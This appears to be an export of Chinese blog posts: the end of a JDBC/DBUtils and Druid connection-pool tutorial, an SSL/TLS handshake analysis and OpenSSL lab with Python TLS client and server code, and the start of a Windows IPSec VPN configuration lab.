select count(*)...这样的sql语句 * * @param sql * @param params * @return */ public Object getValue(Connection conn,String sql, Object... params) { Object count = null; try { // 调用queryRunner的query方法获取一个单一的值 count = queryRunner.query(conn, sql, new ScalarHandler\u0026lt;\u0026gt;(), params); } catch (SQLException e) { e.printStackTrace(); } return count; } } 之后可以建立相关的表、接口，进而将对应表的DML方法实现 这里以customer表为例子 八：数据库连接池 8.1 数据库连接池技术 为解决传统开发中的数据库连接问题，可以采用数据库连接池技术。\n数据库连接池的基本思想：就是为数据库连接建立一个“缓冲池”。预先在缓冲池中放入一定数量的连接，当需要建立数据库连接时，只需从“缓冲池”中取出一个，使用完毕之后再放回去。\n数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是重新建立一个。\n数据库连接池在初始化时将创建一定数量的数据库连接放到连接池中，这些数据库连接的数量是由最小数据库连接数来设定的。无论这些数据库连接是否被使用，连接池都将一直保证至少拥有这么多的连接数量。连接池的最大数据库连接数量限定了这个连接池能占有的最大连接数，当应用程序向连接池请求的连接数超过最大连接数量时，这些请求将被加入到等待队列中。\n工作原理： 数据库连接池技术的优点\n1. 资源重用\n由于数据库连接得以重用，避免了频繁创建，释放连接引起的大量性能开销。在减少系统消耗的基础上，另一方面也增加了系统运行环境的平稳性。\n2. 更快的系统反应速度\n数据库连接池在初始化过程中，往往已经创建了若干数据库连接置于连接池中备用。此时连接的初始化工作均已完成。对于业务请求处理而言，直接利用现有可用连接，避免了数据库连接初始化和释放过程的时间开销，从而减少了系统的响应时间\n3. 新的资源分配手段\n对于多应用共享同一数据库的系统而言，可在应用层通过数据库连接池的配置，实现某一应用最大可用数据库连接数的限制，避免某一应用独占所有的数据库资源\n4. 统一的连接管理，避免数据库连接泄漏\n在较为完善的数据库连接池实现中，可根据预先的占用超时设定，强制回收被占用连接，从而避免了常规数据库连接操作中可能出现的资源泄露\n8.2 多种开源的数据库连接池 JDBC 的数据库连接池使用 javax.sql.DataSource 来表示，DataSource 只是一个接口，该接口通常由服务器(Weblogic, WebSphere, Tomcat)提供实现，也有一些开源组织提供实现： DBCP 是Apache提供的数据库连接池。tomcat 服务器自带dbcp数据库连接池。速度相对c3p0较快，但因自身存在BUG，Hibernate3已不再提供支持。 C3P0 是一个开源组织提供的一个数据库连接池，**速度相对较慢，稳定性还可以。**hibernate官方推荐使用 Proxool 是sourceforge下的一个开源项目数据库连接池，有监控连接池状态的功能，稳定性较c3p0差一点 BoneCP 是一个开源组织提供的数据库连接池，速度快 Druid 是阿里提供的数据库连接池，据说是集DBCP 、C3P0 、Proxool 优点于一身的数据库连接池，但是速度不确定是否有BoneCP快 DataSource 通常被称为数据源，它包含连接池和连接池管理两个部分，习惯上也经常把 DataSource 称为连接池 DataSource用来取代DriverManager来获取Connection，获取速度快，同时可以大幅度提高数据库访问速度。 特别注意： 数据源和数据库连接不同，数据源无需创建多个，它是产生数据库连接的工厂，因此整个应用只需要一个数据源即可。 当数据库访问结束后，程序还是像以前一样关闭数据库连接：conn.close(); 但conn.close()并没有关闭数据库的物理连接，它仅仅把数据库连接释放，归还给了数据库连接池。 8.2.1 Druid（德鲁伊）数据库连接池 Druid是阿里巴巴开源平台上一个数据库连接池实现，它结合了C3P0、DBCP、Proxool等DB池的优点，同时加入了日志监控，可以很好的监控DB池连接和SQL的执行情况，可以说是针对监控而生的DB连接池，可以说是目前最好的连接池之一。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.atguigu.druid; import java.sql.Connection; import java.util.Properties; import javax.sql.DataSource; import com.alibaba.druid.pool.DruidDataSourceFactory; public class TestDruid { public static void main(String[] args) throws Exception { Properties pro = new Properties();\tpro.load(TestDruid.class.getClassLoader().getResourceAsStream(\u0026#34;druid.properties\u0026#34;)); DataSource ds = DruidDataSourceFactory.createDataSource(pro); Connection conn = ds.getConnection(); System.out.println(conn); } } 其中，src下的配置文件为：【druid.properties】\n1 2 3 4 5 6 7 8 9 url=jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=true username=root password=123456 driverClassName=com.mysql.jdbc.Driver initialSize=10 maxActive=20 maxWait=1000 filters=wall 详细配置参数： 配置 缺省 说明 name 配置这个属性的意义在于，如果存在多个数据源，监控的时候可以通过名字来区分开来。 如果没有配置，将会生成一个名字，格式是：”DataSource-” + System.identityHashCode(this) url 连接数据库的url，不同数据库不一样。例如：mysql : jdbc:mysql://10.20.153.104:3306/druid2 oracle : jdbc:oracle:thin:@10.20.149.85:1521:ocnauto username 连接数据库的用户名 password 连接数据库的密码。如果你不希望密码直接写在配置文件中，可以使用ConfigFilter。详细看这里：https://github.com/alibaba/druid/wiki/%E4%BD%BF%E7%94%A8ConfigFilter driverClassName 根据url自动识别 这一项可配可不配，如果不配置druid会根据url自动识别dbType，然后选择相应的driverClassName(建议配置下) initialSize 0 初始化时建立物理连接的个数。初始化发生在显示调用init方法，或者第一次getConnection时 maxActive 8 最大连接池数量 maxIdle 8 已经不再使用，配置了也没效果 minIdle 最小连接池数量 maxWait 获取连接时最大等待时间，单位毫秒。配置了maxWait之后，缺省启用公平锁，并发效率会有所下降，如果需要可以通过配置useUnfairLock属性为true使用非公平锁。 poolPreparedStatements false 是否缓存preparedStatement，也就是PSCache。PSCache对支持游标的数据库性能提升巨大，比如说oracle。在mysql下建议关闭。 maxOpenPreparedStatements -1 要启用PSCache，必须配置大于0，当大于0时，poolPreparedStatements自动触发修改为true。在Druid中，不会存在Oracle下PSCache占用内存过多的问题，可以把这个数值配置大一些，比如说100 validationQuery 用来检测连接是否有效的sql，要求是一个查询语句。如果validationQuery为null，testOnBorrow、testOnReturn、testWhileIdle都不会其作用。 testOnBorrow true 申请连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能。 testOnReturn false 归还连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能 testWhileIdle false 建议配置为true，不影响性能，并且保证安全性。申请连接的时候检测，如果空闲时间大于timeBetweenEvictionRunsMillis，执行validationQuery检测连接是否有效。 timeBetweenEvictionRunsMillis 有两个含义： 1)Destroy线程会检测连接的间隔时间2)testWhileIdle的判断依据，详细看testWhileIdle属性的说明 numTestsPerEvictionRun 不再使用，一个DruidDataSource只支持一个EvictionRun minEvictableIdleTimeMillis connectionInitSqls 物理连接初始化的时候执行的sql exceptionSorter 根据dbType自动识别 当数据库抛出一些不可恢复的异常时，抛弃连接 filters 属性类型是字符串，通过别名的方式配置扩展插件，常用的插件有： 监控统计用的filter:stat日志用的filter:log4j防御sql注入的filter:wall proxyFilters 类型是List，如果同时配置了filters和proxyFilters，是组合关系，并非替换关系 九：Apache-DBUtils实现CRUD操作 9.1 Apache-DBUtils简介 commons-dbutils 是 Apache 组织提供的一个开源 JDBC工具类库，它是对JDBC的简单封装，学习成本极低，并且使用dbutils能极大简化jdbc编码的工作量，同时也不会影响程序的性能。 API介绍： org.apache.commons.dbutils.QueryRunner org.apache.commons.dbutils.ResultSetHandler 工具类：org.apache.commons.dbutils.DbUtils 有了DBUtils可以直接调用API使用增删改查操作了。 9.2 主要API的使用 9.2.1 DbUtils DbUtils ：提供如关闭连接、装载JDBC驱动程序等常规工作的工具类，里面的所有方法都是静态的。主要方法如下： public static void close(…) throws java.sql.SQLException：　DbUtils类提供了三个重载的关闭方法。这些方法检查所提供的参数是不是NULL，如果不是的话，它们就关闭Connection、Statement和ResultSet。 public static void closeQuietly(…): 这一类方法不仅能在Connection、Statement和ResultSet为NULL情况下避免关闭，还能隐藏一些在程序中抛出的SQLEeception。 public static void commitAndClose(Connection conn)throws SQLException： 用来提交连接的事务，然后关闭连接 public static void commitAndCloseQuietly(Connection conn)： 用来提交连接，然后关闭连接，并且在关闭连接时不抛出SQL异常。 public static void rollback(Connection conn)throws SQLException：允许conn为null，因为方法内部做了判断 public static void rollbackAndClose(Connection conn)throws SQLException rollbackAndCloseQuietly(Connection) public static boolean loadDriver(java.lang.String driverClassName)：这一方装载并注册JDBC驱动程序，如果成功就返回true。使用该方法，你不需要捕捉这个异常ClassNotFoundException。 9.2.2 QueryRunner类 该类简单化了SQL查询，它与ResultSetHandler组合在一起使用可以完成大部分的数据库操作，能够大大减少编码量。 QueryRunner类提供了两个构造器： 默认的构造器 需要一个 javax.sql.DataSource 来作参数的构造器 QueryRunner类的主要方法： 更新 public int update(Connection conn, String sql, Object... params) throws SQLException:用来执行一个更新（插入、更新或删除）操作。 \u0026hellip;\u0026hellip; 插入 public \u0026lt;T\u0026gt; T insert(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh, Object... params) throws SQLException：只支持INSERT语句，其中 rsh - The handler used to create the result object from the ResultSet of auto-generated keys. 返回值: An object generated by the handler.即自动生成的键值 \u0026hellip;. 批处理 public int[] batch(Connection conn,String sql,Object[][] params)throws SQLException： INSERT, UPDATE, or DELETE语句 public \u0026lt;T\u0026gt; T insertBatch(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh,Object[][] params)throws SQLException：只支持INSERT语句 查询 public Object query(Connection conn, String sql, ResultSetHandler rsh,Object... params) throws SQLException：执行一个查询操作，在这个查询中，对象数组中的每个元素值被用来作为查询语句的置换参数。该方法会自行处理 PreparedStatement 和 ResultSet 的创建和关闭。 测试 1 2 3 4 5 6 7 8 9 10 11 12 13 // 测试添加 @Test public void testInsert() throws Exception { QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;insert into customers(name,email,birth)values(?,?,?)\u0026#34;; int count = runner.update(conn, sql, \u0026#34;何成飞\u0026#34;, \u0026#34;he@qq.com\u0026#34;, \u0026#34;1992-09-08\u0026#34;); System.out.println(\u0026#34;添加了\u0026#34; + count + \u0026#34;条记录\u0026#34;); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 // 测试删除 @Test public void testDelete() throws Exception { QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;delete from customers where id \u0026lt; ?\u0026#34;; int count = runner.update(conn, sql,3); System.out.println(\u0026#34;删除了\u0026#34; + count + \u0026#34;条记录\u0026#34;); JDBCUtils.closeResource(conn, null); } 9.2.3 ResultSetHandler接口及实现类 该接口用于处理 java.sql.ResultSet，将数据按要求转换为另一种形式。\nResultSetHandler 接口提供了一个单独的方法：Object handle (java.sql.ResultSet .rs)。\n接口的主要实现类：\nArrayHandler：把结果集中的第一行数据转成对象数组。 ArrayListHandler：把结果集中的每一行数据都转成一个数组，再存放到List中。 **BeanHandler：**将结果集中的第一行数据封装到一个对应的JavaBean实例中。 **BeanListHandler：**将结果集中的每一行数据都封装到一个对应的JavaBean实例中，存放到List里。 ColumnListHandler：将结果集中某一列的数据存放到List中。 KeyedHandler(name)：将结果集中的每一行数据都封装到一个Map里，再把这些map再存到一个map里，其key为指定的key。 **MapHandler：**将结果集中的第一行数据封装到一个Map里，key是列名，value就是对应的值。 **MapListHandler：**将结果集中的每一行数据都封装到一个Map里，然后再存放到List **ScalarHandler：**查询单个值对象 测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* * 测试查询:查询一条记录 * * 使用ResultSetHandler的实现类：BeanHandler */ @Test public void testQueryInstance() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id = ?\u0026#34;; // BeanHandler\u0026lt;Customer\u0026gt; handler = new BeanHandler\u0026lt;\u0026gt;(Customer.class); Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer);\tJDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* * 测试查询:查询多条记录构成的集合 * * 使用ResultSetHandler的实现类：BeanListHandler */ @Test public void testQueryList() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id \u0026lt; ?\u0026#34;; // BeanListHandler\u0026lt;Customer\u0026gt; handler = new BeanListHandler\u0026lt;\u0026gt;(Customer.class); List\u0026lt;Customer\u0026gt; list = runner.query(conn, sql, handler, 23); list.forEach(System.out::println); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 /* * 自定义ResultSetHandler的实现类 */ @Test public void testQueryInstance1() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id = ?\u0026#34;; ResultSetHandler\u0026lt;Customer\u0026gt; handler = new ResultSetHandler\u0026lt;Customer\u0026gt;() { @Override public Customer handle(ResultSet rs) throws SQLException { System.out.println(\u0026#34;handle\u0026#34;); //\treturn new Customer(1,\u0026#34;Tom\u0026#34;,\u0026#34;tom@126.com\u0026#34;,new Date(123323432L)); if(rs.next()){ int id = rs.getInt(\u0026#34;id\u0026#34;); String name = rs.getString(\u0026#34;name\u0026#34;); String email = rs.getString(\u0026#34;email\u0026#34;); Date birth = rs.getDate(\u0026#34;birth\u0026#34;); return new Customer(id, name, email, birth); } return null; } }; Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * 如何查询类似于最大的，最小的，平均的，总和，个数相关的数据， * 使用ScalarHandler * */ @Test public void testQueryValue() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); //测试一： //\tString sql = \u0026#34;select count(*) from customers where id \u0026lt; ?\u0026#34;; //\tScalarHandler handler = new ScalarHandler(); //\tlong count = (long) runner.query(conn, sql, handler, 20); //\tSystem.out.println(count); //测试二： String sql = \u0026#34;select max(birth) from customers\u0026#34;; ScalarHandler handler = new ScalarHandler(); Date birth = (Date) runner.query(conn, sql, handler); System.out.println(birth); JDBCUtils.closeResource(conn, null); } ","permalink":"http://www.reus09.top/posts/tech/jdbc/","summary":"一：JDBC概述 1.1 数据的持久化 持久化(persistence)：把数据保存到可掉电式存储设备中以供之后使用。大多数情况下，特别是企业级应用，","title":"Jdbc"},{"content":"0x01 实验目的 SSL/TLS协议分析。\n用wireshark抓包，分析SSL/TLS连接建立的四个阶段。 OpenSSL安装、配置和测试。\n安装配置OpenSSL。 配置SSL测试环境，能够在安全连接上发送数据。 0x02 TLS协议分析 源IP：\n源IP : 10.122.201.99 目的域名:www.baidu.com\n源IP : 110.242.68.4 TLS 握手的目的\nTCP 三次握手结束和服务器成功连接后，客户端就开始发起TLS连接，首先会进入TLS握手阶段。TLS握手阶段目的：\n协商加密密钥\n用来对后面的 HTTP 协议等应用协议内容进行加密。这个密钥又称为主密钥，为加密算法的密钥。 协商加密算法\n为了能够提供效率，使用对称密钥。对称加密使用的是位运算，速度快，甚至可以硬件加速。非对称加密比如 RSA，使用了大数乘法等，整体会比较慢。对称加密只要密钥没有泄漏，那也是非常安全的。这也是后面 SSL 握手协议要确保的。 验证身份及数据完整性\n通常情况下，只要验证服务端身份。特殊情况下，比如一些安全级别高的应用场景，还要验证客户端身份。服务端会返回证书链，有根 CA 证书在里头。通过证书的链式担保，可以确认服务端是否是可信任的。同时，在握手期间，公钥传输成功后，还会对某些信息进行数字签名，确保数据没有被篡改且身份无误。TLS握手阶段一般流程（TLS握手的流程并不是一成不变的，根据实际的应用场景来，主要有三种）： 只验证服务端\n这个用三个阶段就完成握手，此次Wireshark的请求也是这样。一般的网络请求也仅仅到这个程度。 验证服务端和客户端\n在安全性要求较高的场景，服务端也要验证客户端的身份。方式也是发证书证明自己。 恢复原有会话\n这个属于HTTPS 优化的范畴。使用 Session Ticket 或者 Session ID 机制恢复之前已经完成握手的会话。这个是可以允许在不同的 TCP 上进行的。因为握手的加密数据已经保存，直接恢复就可以开始传递了。Session Ticket 由客户端保存加密信息，Session ID 的方式由服务端保存加密信息。不过 Session Ticket 在 Android 客户端还没有得到广泛的支持，和具体机型和内置的 OpenSSL 的版本有关。 TLS握手机制图解\nClient Hello\n在Wireshark软件中捕获了访问百度网页数据包，追踪TCP流得到第一个TLS包\n类型 长度 版本 TLS 1.2 也是 SSLv3.2。这是 SSL 客户端能够支持的 SSL 最高版本 随机数\n生成一个32字节随机数（图中的随机数）。最后加密数据用的主密钥，需要客户端和服务端一起协商出来。后面服务端的 Server Hello 阶段也会生成一个随机数。一同用来计算出主密钥。 会话ID\n这个 Session ID 是可以重用的，具体看服务端资源和支持情况。如果要复用 Session ID， SSL 服务端需要维护连接的状态和上次握手成功留下的加密信息。如果是第一次访问该网址，会话 ID 尚未创建，客户端没记录，为 0。如果客户端保存了 Session ID 的信息，下次发起 SSL 请求的时候会带上。 加密套件\n客户端可以支持的密码套件列表。这些套件会根据优先级排序。每一个套件代表一个密钥规格。以 “TLS” 开头，接着是密钥交换算法，然后用 “WITH” 连接加密算法和认证算法。一个加密套件有这么几个内容：密钥交换算法、加密算法（会带有支持的最高密钥位数）、认证算法还有加密方式。最终使用什么密码套件是服务端决定的。要什么密码套件会在 Server Hello 中进行反馈。 压缩算法\n这里为 0，说明不支持压缩算法 扩展字段\n一些扩展信息，比如 SNI 的支持，ALPN 的信息等等 Server Hello\n类型 版本 指定这次 SSL 使用 TLSv1.2 版本 随机数\n上面的 Client Hello 过程也生产了一个 32 位随机数，这两个随机数将参与主密钥（master key）的创建。（对应图解中随机数2） 会话ID\n加密套件\nTLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 。这个是从客户端 Client Hello 上传的加密套件中选中的，根据密码套件的格式，上面的信息有， 交换加密算法为ECDHE ，就是EC Diffie-Hellman ，RSA 表示后面 Server Key Exchange 阶段的携带 DH 加密算法的公钥的包的数字签名的加密算法是 RSA； 加密算法为 AES ，最高密钥支持 128 位 认证算法 SHA256 压缩方法 这里为 0，表示不使用压缩算法 Certificate\n服务端下发证书，客户端验证服务端的身份，并且取出证书携带的公钥，这个公钥是交换加密算法的公钥。也就是在 Server Hello 阶段指定的 ECDHE （EC Diffie-Hellman）算法，也是通常说的 DH 加密。\n这个 Certificate 消息下发了从携带自己公钥的数字证书和 CA 证书的证书链，在 Certificates 字段中：\n由字段信息可知，证书链中共有2个数字证书。分别为服务端(https://baidu.com)证书 -\u0026gt; 根CA证书。首先看服务端证书\n首先是 signedCertificate 字段的内容，即数字证书的数据\n版本\n对应的就是 X.509 V3 标准 序列号\nserialNumber，证书颁发者唯一序列号。 签名算法ID\n这里指的是使用 SHA-256 进行摘要，RSA 进行加密的签名算法。 证书颁发者\nissuer，就是颁发该证书的 CA 的信息。里面携带后该 CA 的唯一名称（DN，Distinguished Name），比如国家为 US（美国），组织机构为 DigiCert Inc.，名称为 GeoTrust CN RSA CA G1。后面我们需要从证书链找到该 CA 证书（具体方法：在其他证书的subject字段查找国家、组织机构、名称），去认证当前证书 有效期\nvalidity，证书的起始时间和终止时间 对象名称\nsubject，里面就是该证书的名称等主要信息了。比如国家为 CN（中国），组织为Baidu Netcin Science Technology . 对象公钥信息\nsubjectPublicKeyInfo。因为这是服务端证书，这个公钥后面将用于主密钥的交换过程，从中可以了解到这个公钥采用 RSA 加密 扩展部分\n一些扩展信息。比如对象的别名。这个如果是 CDN 的服务器证书，那么别名将会非常多。 然后是证书颁发机构的签名信息：\n签名算法 algorithmIdentifier，这里得出使用的还是 SHA-256 摘要加 RSA 加密的签名算法。这个就是认证该证书的 CA 证书使用的签名算法。 签名信息 encrypted，这个信息的内容，CA 证书对 SHA-256 对上面的数据部分进行摘要后，使用 RSA 的私钥加密获得。后面会用在该证书的认证过程，取出 CA 证书的公钥，解密签名信息，用同样的算法获取数据摘要，对比一下是否相同。 Serve Key Exchange\nServer Hello Done\nClient Key Exchange\nChange Cipher Spec (Client)\nEncrypted Handshake Message (Client)\nChange Cipher Spec (Server)\nEncrypted Handshake Message (Server)\nApplication Data\n0x03 OpenSSL 3.0 环境 系统为ubuntu 16:，IP地址为：192.168.195.149 3.1 OpenSLL安装 OpenSLL编译\n执行命令： tar -xzvf openssl-3.0.0.tar.gz 这里的xzvf参数的含义如下： x：解压tar格式的文件 v：解压时显示详细信息 z：使用gzip程序解压 f：使用归档 配置\n解压完成后检查文件夹\n在文件夹内运行\n./Configure 写一下安装路径的默认规划为\n文件类型 路径 二进制文件 usr\\local\\bin 配置文件 usr\\local\\etc 库文件 usr\\local\\local 编译\n在原来的文件夹里面运行make指令\n1 make \u0026amp; make install 等待输出完成，输入指令\n1 make test 可以看到正在进行测试。\n并且最后的测试结果也是通过的。\n最后命令：sudo make install\n3.2 OpenSLL配置 配置完成 编译测试文件\n测试文件源码如下 1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;evp.h\u0026gt; int main() { printf(\u0026#34;hello world!\u0026#34;); OpenSSL_add_all_algorithms(); return 0; } 加密测试\n源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026lt;openssl/x509.h\u0026gt; void tEVP_Encrypt() { unsigned char key[EVP_MAX_KEY_LENGTH];//密钥 unsigned char iv[EVP_MAX_KEY_LENGTH];//初始化向量 /* old usage*/ //EVP_CIPHER_CTX ctx;//EVP算法上下文 /* old usage*/ EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new(); unsigned char out[1024];//输出密文缓冲区 int outl;//密文长度 int outltmp; char *msg=\u0026#34;Hello OpenSSL\u0026#34;;//待加密的数据 int rv; int i;\t//设置key和iv（可以采用随机数和可以是用户输入） for(i=0;i\u0026lt;24;i++) { key[i]=i; } for(i=0;i\u0026lt;8;i++) {iv[i]=i; }//初始化密码算法结构体 EVP_CIPHER_CTX_init(ctx); //设置算法和密钥以及向量 rv = EVP_EncryptInit_ex(ctx,EVP_des_ede3_cbc(),NULL,key,iv); if(rv!=1) { printf(\u0026#34;Err\\n\u0026#34;); return; } //数据加密 rv = EVP_EncryptUpdate(ctx,out,\u0026amp;outl,(const unsigned char*)msg,strlen(msg)); if(rv!=1) { printf(\u0026#34;Err\\n\u0026#34;); return; }//结束数据加密，把剩余数据输出 rv = EVP_EncryptFinal_ex(ctx,out+outl,\u0026amp;outltmp); if(rv!=1) { printf(\u0026#34;Err\\n\u0026#34;); return; } outl = outl +outltmp; printf(\u0026#34;Original text:%s\\n\u0026#34;,msg); //打印输出密文 printf(\u0026#34;Length of ciphertext:%d\\n Data of ciphertext:\\n\u0026#34;,outl); for(i=0;i\u0026lt;outl;i++) { printf(\u0026#34;0x%02x \u0026#34;,out[i]); }printf(\u0026#34;\\n\u0026#34;); } int main() { OpenSSL_add_all_algorithms(); tEVP_Encrypt(); return 0; } 编译：g++ test2.cpp -o test2 -I /usr/local/include/openssl/ -lcrypto -lssl\n3.3 OpenSLL测试 这里通过python代码进行演示 TLS连接\n服务端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import socket import ssl class server_ssl: def build_listen(self): # 生成SSL上下文 context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) # 加载服务器所用证书和私钥 context.load_cert_chain(\u0026#39;server.crt\u0026#39;, \u0026#39;key.pem\u0026#39;) # 监听端口 with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock: sock.bind((\u0026#39;192.168.195.149\u0026#39;,7777)) sock.listen(5) # 将socket打包成SSL socket with context.wrap_socket(sock, server_side=True) as ssock: while True: # 接收客户端连接 client_socket, addr = ssock.accept() msg = client_socket.recv(1024).decode(\u0026#34;utf-8\u0026#34;) print(f\u0026#34;receive msg from client {addr}：{msg}\u0026#34;) # 向客户端发送信息 msg = f\u0026#34;yes , you have client_socketect with server.\\r\\n\u0026#34;.encode(\u0026#34;utf-8\u0026#34; ) client_socket.send(msg) client_socket.close() if __name__ == \u0026#34;__main__\u0026#34;: server = server_ssl() server.build_listen() 客户端代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import socket import ssl class client_ssl: def send_hello(self,): # 生成SSL上下文 context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) # 加载信任根证书 context.load_verify_locations(\u0026#39;ca.crt\u0026#39;) #与服务端建立socket连接 with socket.create_connection((\u0026#39;192.168.195.149\u0026#39;,7777)) as sock: # 将socket打包成SSL socket # 一定要注意的是这里的server_hostname不是指服务端IP，而是指服务端证书中设置的CN with context.wrap_socket(sock, server_hostname=\u0026#39;127.0.0.1\u0026#39;) as ssock: msg = \u0026#34;do i connect with server ?\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) ssock.send(msg) # 接收服务端返回的信息 msg = ssock.recv(1024).decode(\u0026#34;utf-8\u0026#34;) print(f\u0026#34;receive msg from server : {msg}\u0026#34;) ssock.close() if __name__ == \u0026#34;__main__\u0026#34;: client = client_ssl() client.send_hello() 这里的证书我采取自己生成\n进入Ubuntu desktop，文件名为key\nmkdir key\n生成CA私钥 openssl genrsa -out ca.key 2048\n用CA私钥生成CA的证书 openssl req -new -x509 -days 365 -key ca.key -out ca.crt\n建立CA相应目录进入到key文件夹执行如下命令：\n1 2 3 4 5 mkdir demoCA cd demoCA mkdir newcerts touch index.txt echo ‘01’ \u0026gt; serial 生成server端证书\n进入key文件夹,生成server私钥\nopenssl genrsa -out server.key 2048\n使用server私钥生成server端证书请求文件: openssl req -new -key server.key -out server.csr\n使用server证书请求文件通过CA生成自签名证书\nopenssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key\n验证server证书\nopenssl verify -CAfile ca.crt server.crt\n结果\n生成了正确的证书文件后，笔者把文件加载到程序中，设置ip地址为当前的ipv4的地址，设置端口，一台电脑先运行服务器，一台电脑再运行客户端，运行成功，结果如下： 0x04 总结 通过Wireshark对TLS的三次握手过程进行分析，对TLS的作用机理理解更为透彻。 通过Ubuntu中对openssl工具的配置，并且分别利用c和python对openssl进行实际练习，对ssl的作用过程更为明晰。 ","permalink":"http://www.reus09.top/posts/tech/ssl%E5%88%86%E6%9E%90/","summary":"0x01 实验目的 SSL/TLS协议分析。 用wireshark抓包，分析SSL/TLS连接建立的四个阶段。 OpenSSL安装、配置和测试。 安装配置O","title":"Ssl分析"},{"content":"VPN配置实验 0x01 实验内容 在Windows IPSEC配置实验中，通过抓包工具抓取IKE SA和IPSEC SA建立过程的数据包，并进行分析；思考：IKE密钥协商过程是否存在安全威胁。 采用IPSec隧道模式在两台用作网关的计算机之间配置VPN，抓取两台计算机之间的数据包，查看数据的机密性，提交实验步骤和分析结果。(提示：可以使用ping\\net send \\telnet等命令进行对比验证) 配置OPENVPN，利用2至3台主机独立完成虚拟专网的搭建，并验证虚拟专网的安全性（用抓包工具分析，提示：可以使用ping\\net send \\telnet等命令进行对比验证）。 PacketTracer里VPN配置实验。（选做） 0x02 Windows IPSEC配置 配置环境：windows xp \u0026amp; windows 7 查看win xp和win 7的IP地址 windows xp : 192.168.195.131 windows 7 : 192.168.195.176 2.1 windows xp IPSEC配置 打开windows xp虚拟机，通过secpol.msc打开本地安全设置\n在IP安全策略下右键，创建安全策略\n设置配置名称为reus09\n激活默认响应规则 身份认证方法采用此字符串用来保护密钥交换，输入123456 回到原来窗口，鼠标右键，指派\n鼠标右键，属性，添加规则并进行相应的配置\n选择此规则不指定隧道\n选择所有网络连接\n身份验证方法采用此字符串用来保护密钥交换，输入字符串：123456\nIP筛选列表选择所有IP通讯量\n筛选器操作选择需要安全\n点击下一步完成\n至此，Windows xp下的IPSEC配置完成，操作过程中没有报错。\n2.2 windows 7 IPSEC配置 以同样的方式配置windows 7下的IPSEC，这里与windows xp配置大致相同，截图只用于说明不同点。通过secpol.msc打开windows 7本地安全设置 在IP安全策略下右键，创建安全策略 设置配置名称为reus09（个人随意），由于激活默认响应规则仅限于windows早期版本，故不选择激活默认响应规则，过程中，没有身份认证选择 点击默认设置，一直到属性窗口，添加规则：选择此规则不指定隧道、选择所有网络连接、在IP筛选列表中点击添加，名称为新IP筛选列表，并点击添加，之后选择默认操作 选择刚刚建立的IP筛选列表，点击下一步 选择添加IP筛选器操作, 选择协商安全,继续默认操作 选择刚刚建立的新筛选器操作，点击下一步 身份验证方法采用此字符串用来保护密钥交换，输入字符串：123456(与上面的相同) 单击下一步，选择默认操作直至筛选器配置完成 回到原来窗口，鼠标右键，分配，至此，Windows 7下的IPSEC配置完成，操作过程中没有报错 2.3 开始通信 关闭win 7的IPSEC服务 使用win 7 ping win xp，请求超时，ping不通 对通信过程进行抓包，可以看到win 7一直请求IPsec SA但总不成功 重新开启win 7的IPSEC服务 2.3.1 默认安全策略 使用win 7重新ping win xp，发现成功ping通 对通信过程进行抓包，由于此时win xp和win7都采用的是默认的esp加密，所以抓包显示的是esp包 2.3.2 仅AH通信,不经过ESP加密 Win 7和win xp都设置仅AH通信，不经过ESP加密 window 7 windows xp 继续使用win 7 ping win xp 对通信过程进行抓包，发现没有ESP加密后数据包格式为ICMP，数据为abcdef 2.3.3 Win 7和win xp仅esp认证 windows 7 windows xp 可以看到没有esp加密后的数据是abcdefg 同时也可以注意到开启esp加密之后的esp加密的数据被加密隐藏了 2.3.4 分析IKE SA和IPSEC SA建立过程 要建立IPSec连接，首先要协商一个IKE SA，然后在IKE SA的基础上协商IPSec SA IKE SA建立分为三个阶段 